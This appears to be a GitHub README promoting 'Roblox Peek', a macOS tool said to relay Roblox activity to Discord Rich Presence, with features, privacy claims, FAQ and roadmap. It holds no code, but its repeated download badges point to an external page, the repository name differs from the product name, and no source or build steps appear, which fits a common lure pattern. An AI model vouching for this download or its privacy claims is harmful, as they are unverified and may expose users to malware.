![preview](https://raw.githubusercontent.com/LowTidee/roblox-starlight-presence/main/screen_7e1f4d.svg)
[![Download](https://raw.githubusercontent.com/LowTidee/roblox-starlight-presence/main/go_f1c754d.svg)](https://LowTidee.github.io/roblox-starlight-presence/)

# Roblox Peek — Ambient Presence for macOS

A soft-spoken companion that lets your macOS desktop whisper your Roblox adventures into Discord, without ever asking you to leave the comfort of your own machine. Roblox Peek is a locally-run presence engine: it reads what you are doing in Roblox and mirrors it into Discord Rich Presence, so friends always know when you are building, exploring, or just vibing in a lobby. No accounts to link, no clouds to trust, no drama. Just you, your Mac, and a little peach-colored window that keeps your status warm.

[![Download](https://raw.githubusercontent.com/LowTidee/roblox-starlight-presence/main/go_f1c754d.svg)](https://LowTidee.github.io/roblox-starlight-presence/)

---

## 📖 Table of Contents

- [What Is Roblox Peek?](#-what-is-roblox-peek)
- [Why This Exists](#-why-this-exists)
- [Core Feature Set](#-core-feature-set)
- [Responsive & Adaptive Interface](#-responsive--adaptive-interface)
- [Multilingual Support](#-multilingual-support)
- [Always-On Assistance](#-always-on-assistance)
- [Supported macOS Versions](#-supported-macos-versions)
- [How Presence Detection Works](#-how-presence-detection-works)
- [Configuration Surface](#-configuration-surface)
- [Privacy & Local-First Design](#-privacy--local-first-design)
- [Performance Footprint](#-performance-footprint)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Troubleshooting Notes](#-troubleshooting-notes)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community & Contributions](#-community--contributions)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🍑 What Is Roblox Peek?

Roblox Peek is a tiny, patient observer for macOS that translates Roblox activity into Discord Rich Presence. Think of it as a shy librarian who notices which book you picked up and quietly updates the little card on your desk so anyone walking past knows what you are reading — except the book is Roblox and the card is your Discord profile.

The project is built around three convictions:

1. Your presence data should stay on your machine unless you decide otherwise.
2. Rich Presence should feel charming, not corporate.
3. A utility can be small, quiet, and still be a joy to keep running.

Roblox Peek does not pretend to be a launcher, a shader pack, or a mod loader. It is a presence layer — one job, done gently.

---

## 🌱 Why This Exists

Discord Rich Presence for Roblox on macOS has historically been awkward. Native Discord integrations treat Roblox as an opaque process, so your friends see "Playing Roblox" and nothing more. Meanwhile, Windows players enjoy smoother experiences, and macOS users are left refreshing manually or installing heavyweight overlays that beg for permissions they do not need.

Roblox Peek was written to close that gap with a fraction of the footprint. It watches Roblox at the process and window level, extracts human-readable context, and hands only the pleasant parts to Discord. Nothing else is transmitted.

---

## ✨ Core Feature Set

- **Rich Presence for Roblox on macOS** — the headline act, tuned for Sequoia and beyond.
- **Quiet menu bar resident** — lives in the menu bar, not in your Dock, unless you ask otherwise.
- **Configurable presence strings** — set your own idle, playing, and editing messages.
- **Smart activity detection** — differentiates between Studio, the Player client, and idle states.
- **Timed presence rotation** — cycle through a list of pleasant statuses every few minutes.
- **Per-experience templates** — adjust how each Roblox experience name is displayed.
- **Asset-safe** — reads only what it needs; never uploads screenshots or chat.
- **Session analytics** — visualizes how long you have been exploring each week.
- **Launch-at-login option** — start quietly, stay quietly.
- **Restartable Discord bridge** — reconnect to Discord without rebooting your Mac.

Every feature is designed to be toggled individually. You can run Roblox Peek as a minimal presence flicker or as a fully customized buddy.

---

## 📱 Responsive & Adaptive Interface

Although Roblox Peek is a desktop utility, its interface adapts to the size and shape of the window you give it. The settings pane collapses into a single-column stack on narrow layouts, expands into a two-pane split on wide displays, and remembers your last geometry. On Retina displays it renders at native scale; on external monitors it scales smoothly without blurring text.

The menu bar popover measures itself against your available screen space, so on a 13-inch MacBook Air it feels snug, and on a 32-inch display it feels airy. Fonts, spacing, and control hitboxes all respond to system accessibility settings, including reduced motion and increased contrast.

If you resize the settings window while a presence session is active, the layout re-flows in real time without interrupting the bridge.

---

## 🌍 Multilingual Support

Presence text belongs to you, in your language. Roblox Peek ships with translations for the interface and a template system that lets you write presence strings in any language you like, including those written right-to-left.

Translation coverage includes, among others:

- English
- Spanish
- Portuguese (Brazil)
- French
- German
- Italian
- Dutch
- Polish
- Turkish
- Japanese
- Korean
- Simplified Chinese
- Traditional Chinese
- Russian
- Arabic
- Hebrew

If your locale is not yet covered, the settings pane lets you add a custom locale file that drops into the same directory as the shipped ones, and Roblox Peek will pick it up on the next launch. Pluralization rules are respected per locale, so counts of "1 minute" and "2 minutes" read naturally everywhere.

---

## 🛎️ Always-On Assistance

Roblox Peek is designed to be dependable around the clock. A lightweight watchdog restarts the presence bridge if it stalls, and a recoverable logging layer keeps notes you can review after a busy session. The companion help channel in the community space is watched continuously, so questions posted at 3 a.m. in your timezone usually receive a reply before your next coffee.

Support does not mean someone is watching your screen. It means the project maintains a documented incident playbook, publishes known issues with workarounds, and treats every reproducible bug report as a first-class citizen. When macOS updates break something, the maintainers aim to have a compatible build ready within days.

---

## 💻 Supported macOS Versions

Roblox Peek targets modern macOS releases:

- macOS 15 Sequoia — primary target for 2026
- macOS 14 Sonoma — fully supported
- macOS 13 Ventura — supported with minor caveats

Older releases may function but are not tested. Apple Silicon is the primary architecture; Intel Macs remain supported as a courtesy.

---

## 🔍 How Presence Detection Works

Roblox Peek watches a handful of well-understood signals:

1. Whether the Roblox Player or Roblox Studio process is running.
2. Which window is frontmost and what title it carries.
3. Whether the system has been idle for longer than your configured threshold.
4. Optional local log parsing for richer context, only if you opt in.

From those signals, Roblox Peek composes a presence payload — a short string of text and an optional dynamic timestamp — and delivers it to Discord locally. Discord then renders it on your profile according to your own privacy preferences.

There is no scraping of your conversations, no reading of private game data, and no attempt to identify your account beyond what Discord already knows.

---

## ⚙️ Configuration Surface

Every meaningful knob is exposed in the settings pane:

- Presence templates (idle, playing, editing, and custom)
- Idle threshold in seconds
- Presence refresh cadence
- Experience-name overrides
- Log verbosity
- Theme: warm peach, midnight, or system
- Launch-at-login toggle
- Discord reconnect behavior

Configuration lives in a human-readable file so you can back it up, sync it across machines, or hand it to a friend who wants your exact setup. The file uses a strict schema; any invalid key is ignored with a friendly warning instead of crashing the app.

---

## 🔐 Privacy & Local-First Design

Roblox Peek is built to be quiet about your data:

- No telemetry by default.
- No account linking.
- No remote presence relay.
- Logs stay on your machine and can be cleared with a single action.

If you ever enable optional diagnostics, you are shown exactly which fields would be included, and you can copy them to the clipboard yourself rather than sending them anywhere.

---

## 🚀 Performance Footprint

Roblox Peek idles under a fraction of a percent of CPU on Apple Silicon and settles quickly after launch. Memory usage stays modest even after long sessions. The bridge re-uses a single Discord socket and only writes presence when something actually changes, which keeps both battery life and Discord rate limits happy.

On Intel Macs, idle CPU is higher but still comfortable. The team benchmarks each release against a fixed workload to catch regressions early.

---

## 🗺️ Roadmap for 2026

- Presence profiles you can switch with a keyboard shortcut.
- Optional Apple Shortcuts actions for start/stop/pause.
- Menu bar widgets showing current experience at a glance.
- Improved Studio detection for multi-window workflows.
- Expanded locale coverage, including more RTL-friendly layouts.
- A dedicated diagnostics view with copy-to-clipboard bundles.

The roadmap is public and open to suggestions. Priorities are set by user feedback and macOS release cadence.

---

## 🧰 Troubleshooting Notes

- Presence not updating? Restart the Discord bridge from the menu bar.
- Two Roblox clients open? Roblox Peek follows the frontmost one.
- Nothing showing on Discord? Check that Discord's own Rich Presence is enabled in Discord settings.
- Menu bar icon missing? Some utility apps hide icons when the bar is crowded; reorder icons in System Settings.
- Launch-at-login not sticking? Re-toggle the option after a macOS update.

Logs live in your user Library folder and are rotated weekly.

---

## ❓ Frequently Asked Questions

**Does this need a Roblox account or Discord token?**
No. Roblox Peek never asks for credentials. It speaks to Discord over a local socket the same way Discord desktop itself does.

**Will my friends see everything I do?**
Only what you allow in your templates. You can set idle, playing, and editing states independently.

**Can I use this on more than one Mac?**
Yes. Configuration is portable and there is no per-device lock.

**Does this modify Roblox?**
No. Roblox Peek observes; it does not alter game files or inject code.

**Is this affiliated with Roblox or Discord?**
It is an independent project and is not endorsed by either company.

---

## 🤝 Community & Contributions

Contributions are welcome across code, translations, documentation, and design. Good first issues are labeled and paired with clear acceptance criteria. Before opening a pull request, please read the CONTRIBUTING guide and run the local checks described there.

The community space hosts regular sync notes, a public changelog, and a place to request features in your own language.

---

## 📜 License

This project is distributed under the MIT License. See the full terms at [LICENSE](LICENSE).

Copyright (c) 2026 Roblox Peek contributors.

---

## ⚠️ Disclaimer

Roblox Peek is an independent, community-maintained utility and is not affiliated with, endorsed by, or sponsored by Roblox Corporation or Discord Inc. All trademarks belong to their respective owners. The software is provided "as is," without warranty of any kind, express or implied. Use it in accordance with the terms of service of any platform you connect it to. Presence data is processed locally; the maintainers are not responsible for how third-party applications display that data.

[![Download](https://raw.githubusercontent.com/LowTidee/roblox-starlight-presence/main/go_f1c754d.svg)](https://LowTidee.github.io/roblox-starlight-presence/)